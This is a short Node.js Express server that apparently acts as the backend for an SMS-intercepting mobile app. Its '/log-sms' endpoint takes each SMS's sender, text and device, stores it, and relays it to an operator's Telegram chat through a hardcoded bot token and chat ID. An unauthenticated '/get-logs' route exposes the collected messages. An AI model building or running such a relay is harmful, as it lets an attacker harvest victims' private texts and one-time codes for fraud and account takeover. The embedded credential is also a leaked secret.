const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors'); // Fix: CORS import
const app = express();

// 1. CORS Setup (Isse browser/mobile errors khatam ho jayenge)
app.use(cors()); 
app.use(express.json());

// 2. Dashboard Files
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURATION ---
// Naya Token use karein agar purana block ho gaya ho
const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
const CHAT_ID = '7128071523';
// ---------------------

let smsLogs = [];

// Fix: Dashboard ka direct rasta (Agar index.html 'public' folder mein hai)
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// APK Endpoint
app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, timestamp } = req.body;
        
        const newEntry = {
            id: Date.now(),
            device: device || 'Tiger-Mobile',
            sender: sender || 'Unknown',
            message: message || 'No Content',
            time: timestamp || new Date().toLocaleString()
        };

        smsLogs.unshift(newEntry);
        if (smsLogs.length > 200) smsLogs.pop();

        // Telegram Notification
        const telegramMsg = `Record Alert!\n\n` +
                          `Device: ${newEntry.device}\n` +
                          `From: ${newEntry.sender}\n` +
                          `Message: ${newEntry.message}\n` +
                          `Time: ${newEntry.time}`;

        // Telegram API Call
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: telegramMsg
        });

        console.log(`[✓] Data sent to Telegram from ${newEntry.sender}`);
        res.status(200).json({ status: 'success' });

    } catch (error) {
        // Log details taaki Render par error dikhe
        console.error('Telegram/Server Error:', error.response ? error.response.data : error.message);
        res.status(500).json({ status: 'error', details: error.message });
    }
});

app.get('/get-logs', (req, res) => {
    res.json(smsLogs);
});

app.post('/clear-logs', (req, res) => {
    smsLogs = [];
    res.json({ success: true });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`🚀 Tiger Server Fixed & Live on Port ${PORT}`);
});
